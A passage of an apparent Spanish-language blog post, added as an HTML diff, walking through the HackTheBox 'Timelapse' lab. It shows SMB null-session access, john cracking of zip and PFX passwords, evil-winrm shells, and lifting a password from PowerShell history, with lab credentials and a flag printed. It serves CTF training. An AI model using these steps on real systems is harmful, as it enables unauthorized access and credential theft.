@@ -1,0 +1,705 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Timelapse (easy) | MiguelRega7 - blog</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="HackTheBox - Timelapse (easy)" />
+<meta name="author" content="MiguelRega7" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Posts sobre resolución de CTFs y ciberseguridad." />
+<meta property="og:description" content="Posts sobre resolución de CTFs y ciberseguridad." />
+<link rel="canonical" href="http://localhost:4000/hackthebox/machines/easy/2024/03/30/timelapse.html" />
+<meta property="og:url" content="http://localhost:4000/hackthebox/machines/easy/2024/03/30/timelapse.html" />
+<meta property="og:site_name" content="MiguelRega7 - blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-03-30T00:00:00-06:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HackTheBox - Timelapse (easy)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"MiguelRega7"},"dateModified":"2024-03-30T00:00:00-06:00","datePublished":"2024-03-30T00:00:00-06:00","description":"Posts sobre resolución de CTFs y ciberseguridad.","headline":"HackTheBox - Timelapse (easy)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/machines/easy/2024/03/30/timelapse.html"},"url":"http://localhost:4000/hackthebox/machines/easy/2024/03/30/timelapse.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="MiguelRega7 - blog" />
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">MiguelRega7 - blog</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">HackTheBox - Timelapse (easy)</h1>
+    <p class="post-meta"><time class="dt-published" datetime="2024-03-30T00:00:00-06:00" itemprop="datePublished">
+        Mar 30, 2024
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p align="center">
+<img src="https://labs.hackthebox.com/storage/avatars/bae443f73a706fc8eebc6fb740128295.png" />
+</p>
+
+<ul>
+  <li>En este post vamos a resolver la maquina Timelapse de la plataforma de Hackthebox donde mediante SMB vamos a obtener un zip que contiene un archivo pfx pero antes de obtenerlo tendremos que crackear el zip ya que nos pide la contraseña estaremos usando openssl para obtener un cert y una key usando el pfx una vez obtenemos eso nos conectaremos con evil-winrm y gracias a que un usuario forma parte del grupo LAPS_Readers vamos a poder ver la contraseña del usuario gracias al historial de powershell para la escalada de privilegios estaremos abusando del grupo LAPS_Readers y usaremos Get-LAPSPasswords para dumpear las contraseñas entre ellas la del Administrator.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.129.141.32
+PING 10.129.141.32 <span class="o">(</span>10.129.141.32<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+64 bytes from 10.129.141.32: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>127 <span class="nb">time</span><span class="o">=</span>147 ms
+
+<span class="nt">---</span> 10.129.141.32 ping statistics <span class="nt">---</span>
+1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
+rtt min/avg/max/mdev <span class="o">=</span> 147.439/147.439/147.439/0.000 ms
+❯ whichSystem.py 10.129.141.32
+
+10.129.141.32 <span class="o">(</span>ttl -&gt; 127<span class="o">)</span>: Windows
+</code></pre></div></div>
+
+<h2 id="portscan">PortScan</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,49673,49674,49697 10.129.141.32 <span class="nt">-oN</span> targeted
+Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-07-26 12:08 CST
+Nmap scan report <span class="k">for </span>10.129.141.32
+Host is up <span class="o">(</span>0.15s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT      STATE SERVICE           VERSION
+53/tcp    open  domain            Simple DNS Plus
+88/tcp    open  kerberos-sec      Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2023-07-27 02:08:34Z<span class="o">)</span>
+135/tcp   open  msrpc             Microsoft Windows RPC
+139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
+389/tcp   open  ldap              Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: timelapse.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ldapssl?
+3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: timelapse.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+3269/tcp  open  globalcatLDAPssl?
+5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_ssl-date: 2023-07-27T02:10:06+00:00<span class="p">;</span> +7h59m59s from scanner time.
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc01.timelapse.htb
+| Not valid before: 2021-10-25T14:05:29
+|_Not valid after:  2022-10-25T14:25:29
+| tls-alpn: 
+|_  http/1.1
+9389/tcp  open  mc-nmf            .NET Message Framing
+49667/tcp open  msrpc             Microsoft Windows RPC
+49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+49674/tcp open  msrpc             Microsoft Windows RPC
+49697/tcp open  msrpc             Microsoft Windows RPC
+Service Info: Host: DC01<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 7h59m58s, deviation: 0s, median: 7h59m57s
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   <span class="nb">date</span>: 2023-07-27T02:09:27
+|_  start_date: N/A
+</code></pre></div></div>
+
+<h2 id="enumeracion">Enumeracion</h2>
+
+<ul>
+  <li>Vamos a ver primeramente ante que estamos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.129.141.32
+SMB         10.129.141.32   445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:timelapse.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos agregar el dominio al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">echo</span> <span class="s2">"10.129.141.32 timelapse.htb dc01.timelapse.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/host
+10.129.141.32 timelapse.htb dc01.timelapse.htb
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a comenzar viendo los recursos compartidos por <strong>SMB</strong> para ver si podemos listar algunos empleando un <strong>Null Session</strong> por que de momento no contamos con credenciales.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient <span class="nt">-L</span> 10.129.141.32 <span class="nt">-N</span>
+
+	Sharename       Type      Comment
+	<span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
+	ADMIN<span class="nv">$ </span>         Disk      Remote Admin
+	C<span class="nv">$ </span>             Disk      Default share
+	IPC<span class="nv">$ </span>           IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	Shares          Disk      
+	SYSVOL          Disk      Logon server share 
+SMB1 disabled <span class="nt">--</span> no workgroup available
+</code></pre></div></div>
+
+<ul>
+  <li>Vemos un archivo <code class="language-plaintext highlighter-rouge">winrm_backup.zip</code> vamos a traerlo a nuestra maquina de atacante.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient <span class="nt">-N</span> //10.129.141.32/Shares
+Try <span class="s2">"help"</span> to get a list of possible commands.
+smb: <span class="se">\&gt;</span> <span class="nb">dir</span>
+  <span class="nb">.</span>                                   D        0  Mon Oct 25 10:39:15 2021
+  ..                                  D        0  Mon Oct 25 10:39:15 2021
+  Dev                                 D        0  Mon Oct 25 14:40:06 2021
+  HelpDesk                            D        0  Mon Oct 25 10:48:42 2021
+
+		6367231 blocks of size 4096. 1245724 blocks available
+smb: <span class="se">\&gt;</span> <span class="nb">cd </span>Dev
+smb: <span class="se">\D</span>ev<span class="se">\&gt;</span> <span class="nb">dir</span>
+  <span class="nb">.</span>                                   D        0  Mon Oct 25 14:40:06 2021
+  ..                                  D        0  Mon Oct 25 14:40:06 2021
+  winrm_backup.zip                    A     2611  Mon Oct 25 10:46:42 2021
+
+		6367231 blocks of size 4096. 1244581 blocks available
+smb: <span class="se">\D</span>ev<span class="se">\&gt;</span> get winrm_backup.zip
+getting file <span class="se">\D</span>ev<span class="se">\w</span>inrm_backup.zip of size 2611 as winrm_backup.zip <span class="o">(</span>2.0 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 2.0 KiloBytes/sec<span class="o">)</span>
+smb: <span class="se">\D</span>ev<span class="se">\&gt;</span> 
+</code></pre></div></div>
+
+<h2 id="shell-as-legacyy">Shell as legacyy</h2>
+
+<ul>
+  <li>Vemos que dentro hay un <code class="language-plaintext highlighter-rouge">.pfx</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ 7z l winrm_backup.zip
+
+7-Zip <span class="o">[</span>64] 16.02 : Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 <span class="o">(</span><span class="nv">locale</span><span class="o">=</span>es_MX.UTF-8,Utf16<span class="o">=</span>on,HugeFiles<span class="o">=</span>on,64 bits,2 CPUs Intel<span class="o">(</span>R<span class="o">)</span> Core<span class="o">(</span>TM<span class="o">)</span> i5-1035G1 CPU @ 1.00GHz <span class="o">(</span>706E5<span class="o">)</span>,ASM,AES-NI<span class="o">)</span>
+
+Scanning the drive <span class="k">for </span>archives:
+1 file, 2611 bytes <span class="o">(</span>3 KiB<span class="o">)</span>
+
+Listing archive: winrm_backup.zip
+
+<span class="nt">--</span>
+Path <span class="o">=</span> winrm_backup.zip
+Type <span class="o">=</span> zip
+Physical Size <span class="o">=</span> 2611
+
+   Date      Time    Attr         Size   Compressed  Name
+<span class="nt">-------------------</span> <span class="nt">-----</span> <span class="nt">------------</span> <span class="nt">------------</span>  <span class="nt">------------------------</span>
+2021-10-25 08:21:20 .....         2555         2405  legacyy_dev_auth.pfx
+<span class="nt">-------------------</span> <span class="nt">-----</span> <span class="nt">------------</span> <span class="nt">------------</span>  <span class="nt">------------------------</span>
+2021-10-25 08:21:20               2555         2405  1 files
+</code></pre></div></div>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/timelapse/web1.png" />
+</p>
+
+<ul>
+  <li>Nos pide contraseña.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ 7z x winrm_backup.zip
+
+7-Zip <span class="o">[</span>64] 16.02 : Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 <span class="o">(</span><span class="nv">locale</span><span class="o">=</span>es_MX.UTF-8,Utf16<span class="o">=</span>on,HugeFiles<span class="o">=</span>on,64 bits,2 CPUs Intel<span class="o">(</span>R<span class="o">)</span> Core<span class="o">(</span>TM<span class="o">)</span> i5-1035G1 CPU @ 1.00GHz <span class="o">(</span>706E5<span class="o">)</span>,ASM,AES-NI<span class="o">)</span>
+
+Scanning the drive <span class="k">for </span>archives:
+1 file, 2611 bytes <span class="o">(</span>3 KiB<span class="o">)</span>
+
+Extracting archive: winrm_backup.zip
+<span class="nt">--</span>
+Path <span class="o">=</span> winrm_backup.zip
+Type <span class="o">=</span> zip
+Physical Size <span class="o">=</span> 2611
+
+    
+Enter password <span class="o">(</span>will not be echoed<span class="o">)</span>:
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a usar <code class="language-plaintext highlighter-rouge">john</code> para poder ver la contraseña.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ zip2john winrm_backup.zip <span class="o">&gt;</span> <span class="nb">hash
+</span>ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: 2b chk, TS_chk, <span class="nv">cmplen</span><span class="o">=</span>2405, <span class="nv">decmplen</span><span class="o">=</span>2555, <span class="nv">crc</span><span class="o">=</span>12EC5683
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
+</span>Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>PKZIP <span class="o">[</span>32/64]<span class="o">)</span>
+Will run 2 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+supremelegacy    <span class="o">(</span>winrm_backup.zip/legacyy_dev_auth.pfx<span class="o">)</span>
+1g 0:00:00:00 DONE <span class="o">(</span>2023-07-26 12:27<span class="o">)</span> 1.428g/s 4956Kp/s 4956Kc/s 4956KC/s surfroxy154..superview1024
+Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
+Session completed
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora si podemos traernos el archivo.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ unzip winrm_backup.zip
+Archive:  winrm_backup.zip
+<span class="o">[</span>winrm_backup.zip] legacyy_dev_auth.pfx password: 
+  inflating: legacyy_dev_auth.pfx    
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Si recordamos nos dicen que <code class="language-plaintext highlighter-rouge">pfx</code> es una clave privada de un certificado así que necesitamos extraer ese certificado <a href="https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file">https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file</a>.</p>
+  </li>
+  <li>
+    <p>Siguiente los pasos del articulo vemos que si hacemos lo siguiente para extraer la <strong>private key</strong> nos pide contraseña.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/timelapse/web2.png" />
+</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ openssl pkcs12 <span class="nt">-in</span> legacyy_dev_auth.pfx <span class="nt">-clcerts</span> <span class="nt">-nokeys</span> <span class="nt">-out</span> cert
+Enter Import Password:
+</code></pre></div></div>
+
+<ul>
+  <li>Pero bueno podemos usar <code class="language-plaintext highlighter-rouge">pfx2john</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python2 /usr/share/john/pfx2john.py legacyy_dev_auth.pfx <span class="o">&gt;</span> <span class="nb">hash</span>
+❯ john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
+</span>Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>pfx <span class="o">[</span>PKCS12 PBE <span class="o">(</span>.pfx, .p12<span class="o">)</span> <span class="o">(</span>SHA-1 to SHA-512<span class="o">)</span> 512/512 AVX512BW 16x]<span class="o">)</span>
+Cost 1 <span class="o">(</span>iteration count<span class="o">)</span> is 2000 <span class="k">for </span>all loaded hashes
+Cost 2 <span class="o">(</span>mac-type <span class="o">[</span>1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]<span class="o">)</span> is 1 <span class="k">for </span>all loaded hashes
+Will run 2 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+thuglegacy       <span class="o">(</span>legacyy_dev_auth.pfx<span class="o">)</span>
+1g 0:00:00:42 DONE <span class="o">(</span>2023-07-26 12:48<span class="o">)</span> 0.02365g/s 76436p/s 76436c/s 76436C/s thuglife06..thsco04
+Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
+Session completed
+</code></pre></div></div>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/timelapse/web3.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Ahora si podemos seguir.</p>
+  </li>
+  <li>
+    <p>Vamos a extraer el certificado y la clave privada.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ openssl pkcs12 <span class="nt">-in</span> legacyy_dev_auth.pfx <span class="nt">-clcerts</span> <span class="nt">-nokeys</span> <span class="nt">-out</span> cert
+Enter Import Password:
+❯ openssl pkcs12 <span class="nt">-in</span> legacyy_dev_auth.pfx <span class="nt">-nocerts</span> <span class="nt">-out</span> key
+Enter Import Password:
+Enter PEM pass phrase:
+Verifying - Enter PEM pass phrase:
+</code></pre></div></div>
+
+<ul>
+  <li>El puerto <code class="language-plaintext highlighter-rouge">5986/tcp</code> es abierto así que nos podemos conectar empleando <code class="language-plaintext highlighter-rouge">winrm</code> con el <code class="language-plaintext highlighter-rouge">cert</code> y la <code class="language-plaintext highlighter-rouge">key</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ evil-winrm <span class="nt">-h</span>
+                                        
+Evil-WinRM shell v3.5
+
+Usage: evil-winrm <span class="nt">-i</span> IP <span class="nt">-u</span> USER <span class="o">[</span><span class="nt">-s</span> SCRIPTS_PATH] <span class="o">[</span><span class="nt">-e</span> EXES_PATH] <span class="o">[</span><span class="nt">-P</span> PORT] <span class="o">[</span><span class="nt">-p</span> PASS] <span class="o">[</span><span class="nt">-H</span> HASH] <span class="o">[</span><span class="nt">-U</span> URL] <span class="o">[</span><span class="nt">-S</span><span class="o">]</span> <span class="o">[</span><span class="nt">-c</span> PUBLIC_KEY_PATH <span class="o">]</span> <span class="o">[</span><span class="nt">-k</span> PRIVATE_KEY_PATH <span class="o">]</span> <span class="o">[</span><span class="nt">-r</span> REALM] <span class="o">[</span><span class="nt">--spn</span> SPN_PREFIX] <span class="o">[</span><span class="nt">-l</span><span class="o">]</span>
+    <span class="nt">-S</span>, <span class="nt">--ssl</span>                        Enable ssl
+    <span class="nt">-c</span>, <span class="nt">--pub-key</span> PUBLIC_KEY_PATH    Local path to public key certificate
+    <span class="nt">-k</span>, <span class="nt">--priv-key</span> PRIVATE_KEY_PATH  Local path to private key certificate
+    <span class="nt">-r</span>, <span class="nt">--realm</span> DOMAIN               Kerberos auth, it has to be <span class="nb">set </span>also <span class="k">in</span> /etc/krb5.conf file using this format -&gt; CONTOSO.COM <span class="o">=</span> <span class="o">{</span> kdc <span class="o">=</span> fooserver.contoso.com <span class="o">}</span>
+    <span class="nt">-s</span>, <span class="nt">--scripts</span> PS_SCRIPTS_PATH    Powershell scripts <span class="nb">local </span>path
+        <span class="nt">--spn</span> SPN_PREFIX             SPN prefix <span class="k">for </span>Kerberos auth <span class="o">(</span>default HTTP<span class="o">)</span>
+    <span class="nt">-e</span>, <span class="nt">--executables</span> EXES_PATH      C# executables <span class="nb">local </span>path
+    <span class="nt">-i</span>, <span class="nt">--ip</span> IP                      Remote host IP or hostname. FQDN <span class="k">for </span>Kerberos auth <span class="o">(</span>required<span class="o">)</span>
+    <span class="nt">-U</span>, <span class="nt">--url</span> URL                    Remote url endpoint <span class="o">(</span>default /wsman<span class="o">)</span>
+    <span class="nt">-u</span>, <span class="nt">--user</span> USER                  Username <span class="o">(</span>required <span class="k">if </span>not using kerberos<span class="o">)</span>
+    <span class="nt">-p</span>, <span class="nt">--password</span> PASS              Password
+    <span class="nt">-H</span>, <span class="nt">--hash</span> HASH                  NTHash
+    <span class="nt">-P</span>, <span class="nt">--port</span> PORT                  Remote host port <span class="o">(</span>default 5985<span class="o">)</span>
+    <span class="nt">-V</span>, <span class="nt">--version</span>                    Show version
+    <span class="nt">-n</span>, <span class="nt">--no-colors</span>                  Disable colors
+    <span class="nt">-N</span>, <span class="nt">--no-rpath-completion</span>        Disable remote path completion
+    <span class="nt">-l</span>, <span class="nt">--log</span>                        Log the WinRM session
+    <span class="nt">-h</span>, <span class="nt">--help</span>                       Display this <span class="nb">help </span>message
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ evil-winrm <span class="nt">-S</span> <span class="nt">-i</span> 10.129.141.32 <span class="nt">-c</span> cert <span class="nt">-k</span> key
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Warning: SSL enabled
+                                        
+Info: Establishing connection to remote endpoint
+Enter PEM pass phrase: thuglegacy
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\l</span>egacyy<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
+</span>timelapse<span class="se">\l</span>egacyy
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\l</span>egacyy<span class="se">\D</span>ocuments&gt; 
+</code></pre></div></div>
+
+<h2 id="usertxt">User.txt</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers&gt; Get-ChildItem <span class="nt">-Path</span> C:<span class="se">\ </span><span class="nt">-Recurse</span> <span class="nt">-Filter</span> <span class="s2">"user.txt"</span> <span class="nt">-ErrorAction</span> SilentlyContinue
+Enter PEM pass phrase:
+
+
+    Directory: C:<span class="se">\U</span>sers<span class="se">\l</span>egacyy<span class="se">\D</span>esktop
+
+
+Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+<span class="nt">-ar---</span>        7/26/2023   7:01 PM             34 user.txt
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\l</span>egacyy<span class="se">\D</span>ocuments&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\l</span>egacyy<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
+9a2077a3a7ce5b1fec186ad86b228077
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\l</span>egacyy<span class="se">\D</span>ocuments&gt; 
+</code></pre></div></div>
+
+<h2 id="shell-as-svc_deploy">Shell as svc_deploy</h2>
+
+<ul>
+  <li>Aquí vemos varios usuarios.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\l</span>egacyy<span class="se">\D</span>ocuments&gt; net user
+Enter PEM pass phrase:
+
+User accounts <span class="k">for</span> <span class="se">\\</span>
+
+<span class="nt">-------------------------------------------------------------------------------</span>
+Administrator            babywyrm                 Guest
+krbtgt                   legacyy                  payl0ad
+sinfulz                  svc_deploy               thecybergeek
+TRX
+The <span class="nb">command </span>completed with one or more errors.
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\l</span>egacyy<span class="se">\D</span>ocuments&gt; 
+</code></pre></div></div>
+
+<ul>
+  <li>Si examinamos a que grupos pertenecen cada usuario vemos que <code class="language-plaintext highlighter-rouge">svc_deploy</code> forma parte de <code class="language-plaintext highlighter-rouge">LAPS_Readers</code> ademas forma parte del grupo <code class="language-plaintext highlighter-rouge">Remote Management Users</code> así que podemos conectarnos con <code class="language-plaintext highlighter-rouge">evil-winrm</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\l</span>egacyy<span class="se">\D</span>ocuments&gt; net user svc_deploy
+Enter PEM pass phrase:
+User name                    svc_deploy
+Full Name                    svc_deploy
+Comment
+User<span class="s1">'s comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            10/25/2021 12:12:37 PM
+Password expires             Never
+Password changeable          10/26/2021 12:12:37 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   10/25/2021 12:25:53 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Management Use
+Global Group memberships     *LAPS_Readers         *Domain Users
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\legacyy\Documents&gt; 
+</span></code></pre></div></div>
+
+<ul>
+  <li><a href="https://www.hackingarticles.in/credential-dumpinglaps/">https://www.hackingarticles.in/credential-dumpinglaps/</a> en este caso como estamos en <code class="language-plaintext highlighter-rouge">powershell</code> podemos ver el historial de comandos como el <code class="language-plaintext highlighter-rouge">bash_history</code>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/timelapse/web4.png" />
+</p>
+
+<ul>
+  <li>Y hay vemos la contraseña del usuario <code class="language-plaintext highlighter-rouge">E3R$Q62^12p7PLlC%KWaxuaV</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\l</span>egacyy&gt; <span class="nb">type </span>AppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\P</span>owerShell<span class="se">\P</span>SReadLine<span class="se">\C</span>onsoleHost_history.txt
+Enter PEM pass phrase:
+<span class="nb">whoami
+</span>ipconfig /all
+netstat <span class="nt">-ano</span> |select-string LIST
+<span class="nv">$so</span> <span class="o">=</span> New-PSSessionOption <span class="nt">-SkipCACheck</span> <span class="nt">-SkipCNCheck</span> <span class="nt">-SkipRevocationCheck</span>
+<span class="nv">$p</span> <span class="o">=</span> ConvertTo-SecureString <span class="s1">'E3R$Q62^12p7PLlC%KWaxuaV'</span> <span class="nt">-AsPlainText</span> <span class="nt">-Force</span>
+<span class="nv">$c</span> <span class="o">=</span> New-Object System.Management.Automation.PSCredential <span class="o">(</span><span class="s1">'svc_deploy'</span>, <span class="nv">$p</span><span class="o">)</span>
+invoke-command <span class="nt">-computername</span> localhost <span class="nt">-credential</span> <span class="nv">$c</span> <span class="nt">-port</span> 5986 <span class="nt">-usessl</span> -
+SessionOption <span class="nv">$so</span> <span class="nt">-scriptblock</span> <span class="o">{</span><span class="nb">whoami</span><span class="o">}</span>
+get-aduser <span class="nt">-filter</span> <span class="k">*</span> <span class="nt">-properties</span> <span class="k">*</span>
+<span class="nb">exit</span>
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\l</span>egacyy&gt; 
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora nos podemos conectar.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ evil-winrm <span class="nt">-S</span> <span class="nt">-i</span> 10.129.141.32 <span class="nt">-u</span> svc_deploy <span class="nt">-p</span> <span class="s1">'E3R$Q62^12p7PLlC%KWaxuaV'</span>
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
+                                        
